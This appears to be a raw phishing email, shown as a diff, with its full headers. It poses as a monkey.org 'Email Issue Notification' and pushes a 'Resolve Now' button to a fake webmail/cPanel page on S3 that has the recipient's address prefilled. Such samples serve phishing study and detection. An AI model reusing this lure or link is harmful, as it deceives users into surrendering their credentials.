@@ -1,0 +1,179 @@
+Return-Path: no-repy@feslegen.com.tr
+Delivered-To: jose@monkey.org
+X-FDA: 83013741300.31.4D6CEE6
+Received: from mxp.feslegen.com.tr (mxp.feslegen.com.tr [176.236.57.46])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP id 01185120008
+	for <jose@monkey.org>; Thu, 16 Jan 2025 15:46:08 +0000 (UTC)
+Authentication-Results: imf25.b.hostedemail.com;
+	dkim=pass header.d=feslegen.com.tr
+ header.s=9B3C5098-DD80-11EE-9272-D2BA2EDC2A4F header.b=n5Q07ljD;
+	dmarc=pass (policy=quarantine) header.from=feslegen.com.tr;
+	spf=pass (imf25.b.hostedemail.com: domain of no-repy@feslegen.com.tr
+ designates 176.236.57.46 as permitted sender)
+ smtp.mailfrom=no-repy@feslegen.com.tr
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1737042369;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=Fse0tq7kYhpKYGC16xgR3cMYMrKGAAW9Y2dVcyDOmFE=;
+	b=HjIovKuGWA9++iAAPijnYzH89LeKchVmz3mg9hVa10naQItKvg1FCjlRDNuPI3bALJFD/w
+	Pzq5Q0ghfO84RCLq5EH/a6mbJazGyk7vJTY0gPVpF8icpvALmWrIowuaSeKDNnxBAUdyI+
+	0zKjeUGPth2ZRJhKgbFvRnD5PB/ecuw=
+ARC-Authentication-Results: i=1;
+	imf25.b.hostedemail.com;
+	dkim=pass header.d=feslegen.com.tr
+ header.s=9B3C5098-DD80-11EE-9272-D2BA2EDC2A4F header.b=n5Q07ljD;
+	dmarc=pass (policy=quarantine) header.from=feslegen.com.tr;
+	spf=pass (imf25.b.hostedemail.com: domain of no-repy@feslegen.com.tr
+ designates 176.236.57.46 as permitted sender)
+ smtp.mailfrom=no-repy@feslegen.com.tr
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1737042369; a=rsa-sha256;
+	cv=none;
+	b=U+RIG1Izbd3YObfH6gFG7gipzym2ilnoKyhx8eUUuoXYgvNbmw7Romb2L7xQQNhGaVtHvZ
+	gljPhFe87ZlF9KWTpKQUU/P8oxTE+/RFE5UmIVlnuGmpj6g/YHlsCEk5SxM/2FJWvMXFwc
+	CcEL0JCKotrIY3DhOQ3ez85Valf9mCU=
+Received: from mxp.feslegen.com.tr (localhost.localdomain [127.0.0.1])
+	by mxp.feslegen.com.tr (Proxmox) with ESMTP id B6B8C4C88D2
+	for <jose@monkey.org>; Thu, 16 Jan 2025 18:46:06 +0300 (+03)
+DKIM-Filter: OpenDKIM Filter v2.10.3 mail.feslegen.com.tr 47CB132C504D
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=feslegen.com.tr;
+	s=9B3C5098-DD80-11EE-9272-D2BA2EDC2A4F; t=1737042236;
+	bh=Fse0tq7kYhpKYGC16xgR3cMYMrKGAAW9Y2dVcyDOmFE=;
+	h=From:To:Date:Message-ID:MIME-Version;
+	b=n5Q07ljD8RSKadBGIBANBVe33dXtCMRE2zr9KgOe5+oLHADj73Kx9tFAcQ/xa5Xop
+	 16yEUQB0VtulMYOqnGHhAVTzlizEjZnRXYthTfhFHEVx45i7uRs6Tij9rQ/hUku/OL
+	 UIt9JOetMr5EF+IbqTciFNAkoS79kod2UZgvSANJ9TDzjl98OnTJr9xZRfdMWGN2r9
+	 1Mc17WXRQNcF7Hu1tcUiWw6LsJ2u2bIfcfVIXi+YFhOZdcbycvDg3+meBTambmkZUN
+	 e9tizkBellNkoFkZ6kR51bn6P4J5UQfce1TBlC+lWHfVM7dxWCTPR6yRzvdpm12WSg
+	 rg4uFsNBoHksQ==
+X-Virus-Scanned: amavis at mail.feslegen.com.tr
+From: monkey.org <no-repy@feslegen.com.tr>
+To: jose@monkey.org
+Subject: Email Issue Notification
+Date: 16 Jan 2025 16:45:09 +0100
+Message-ID: <20250116164509.30E6EB7F111B303B@feslegen.com.tr>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 01185120008
+X-Stat-Signature: 4r4fgtbwwnukuhigq1ergbh9d3nz4mcs
+X-Rspam-User: 
+X-Spam-Status: No, score=0.52
+X-Rspamd-Server: rspam12
+X-HE-Tag: 1737042368-654391
+X-HE-Meta: 
+ U2FsdGVkX19ISge1Phhsw0rBVcokDamZA79hKyb4C+1CT0aXl1pnbAR6TfBuv2tYWoK6coTPEqqcwX+9fRJodK472rX3BDtUhWI02/m2SHsh3geU2I8GBhBJQfvu5+nEIh0Kl9Ezepw1uxm/bb7PwewQ+Z/umyz7/AmJbJjX1IYzfY4SRYUgFYz6TpoLpw2BJUGQHRIzlyNnsD5ySsSdTIJtZI67SH1qduOwe3EUh0sZrzejVX3w+akfe+VX2yZp8xNx24+fVF8iMfuKT4OuFT0PY4h+69VOD7H5fFiW+W65A9kdZvnbVogroNVcgpAy2Q0VPin3uXezqrq6uGPLYTNO2J+m3WPGK19/6KEHanmQxmibHhjftFx831Q0boEePKqF7Ap4D0jF5SThZ8h8i5kUMmuTqryIkRDHES0RfajpN0RDcGB8+XUHwPXKNdk+fxzwpun8DXI5ZkrQeI50TBsBPxna/Gk0I9CdiN2tpMJ5Ozm486gEQrmbfcsiYAtF1JvOUw1swp8QXGoPnyD0KTV0hj2yVOt+YaD3cFrFHEkw29rV4Rv++Gtl8eC3N6d1y0UQKpPs9fB14jVi3vyvCbgRP+rtdTCIRdn/5+9U/AeZ9g68Kp1+Inclpdm7IIn3cdRg9iUuGR/RACvh98n3mZ7L2s8dlxIDtXeoEK/h6JNDTm/xkYExx9IWkUr5gHj/u0JJs5KcUR1erTLOVAV6AZ2uH4ivGvyhGXIYHm7nwEmIMl8sfemrzUf4wWyLFz4ZxqeazNVOUg7ol9W4CX7Q6HAxJZIcr3sA/r4OYXMBPxS/CbO19VPy/ohuy1xe/ve4d/HBM0X33PbO4hqyaLEL7v38YgI5qPRX3fffcxAbEwTi7ALvfYAZctT0X7R+A5G1VtdvTN6Mjypto5QfKCRwsTjzbYSP3b1oiv7mN3vevvX+EaScbon2JefOkUAQTzn9Wm7ZfdLdA9tvHOLjpH/s/o+HCod
+ CPgCdRyrqi4bzde4UUfq/X0DMLWfLq4DroBF+xhQ809B1Cc1oFvU7aXnA7kPD9z8738S6wJoJUJv6I9dijtfXlbqFewkr/YuQXnOhhjrQu14dRDUkq/6zr7wUuhFqLF7ioAr3SDIpmiF2KlcFO1rTdEFUnijrP2Hph89H5r8hNWaQRW9pQRDrb+E5nmKCASTlHbH4OvrWaeZlycMrRC5TfRMY5rkJdIlOnDrc5H6TzHp45IGD7RNtnvZqZg1oAc6XGfDZqjeCBu5N/1YqI6zefU3g642DvzDbmuTPXCHp2nLjAllRhAGpqHsQ5AFwx70Fpr07Y+4n7x+xxrP9WmNadGwYoUYuq2ea30UhvNNxqB/x7+JLFJUkVTmblw==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 12
+
+<!DOCTYPE html>
+
+<html lang=3D"en"><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta charset=3D"UTF-8">
+    <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=
+=3D1.0">
+    <meta name=3D"generator" content=3D"MSHTML 11.00.10570.1001">
+    <title>Email Issue Notification</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+
+        .container {
+            width: 640px;
+            margin: 20px auto;
+            background: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 20px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        h1 {
+            font-size: 16px;
+            color: #2d8cff;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #747487;
+            margin: 10px 0;
+        }
+
+        a.button {
+            display: inline-block;
+            background-color: #2d8cff;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 15px 50px;
+            margin-top: 20px;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        a.button:hover {
+            background-color: #1a6bcc;
+        }
+    </style>
+</head>
+
+<body style=3D"font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4">
+    <div style=3D"width: 640px;
+            margin: 20px auto;
+            background: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 20px;
+            text-align: center;
+            line-height: 1.5" class=3D"container">
+        <h1 style=3D"font-size: 16px;
+            color: #2d8cff;
+            margin-bottom: 20px">Email Issue Notification</h1>
+        <p style=3D"font-size: 14px;
+            color: #747487;
+            margin: 10px 0"> <a href=3D"mailto:monkey.org">monkey.org</a>,<=
+/p>
+        <p style=3D"font-size: 14px;
+            color: #747487;
+            margin: 10px 0">Your email address has rejected some important =
+incoming messages. This is due to a technical error with your mail server.<=
+/p>
+        <p style=3D"font-size: 14px;
+            color: #747487;
+            margin: 10px 0">Follow below link to automatically resolve your=
+ domain mx record.</p>
+        <a href=3D"https://console-roundcubee.s3.us-east-1.amazonaws.com/pa=
+reee-webmail/cpanelnewround.html#jose@monkey.org"><a style=3D"display: inli=
+ne-block;
+            background-color: #2d8cff;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 15px 50px;
+            margin-top: 20px;
+            border-radius: 5px;
+            font-size: 14px" class=3D"button" href=3D"https://console-round=
+cubee.s3.us-east-1.amazonaws.com/pareee-webmail/cpanelnewround.html#jose@mo=
+nkey.org" target=3D"_blank" rel=3D"noreferrer">Resolve Now</a>
+    </div>
+
+
+
+</body></html>
+
+
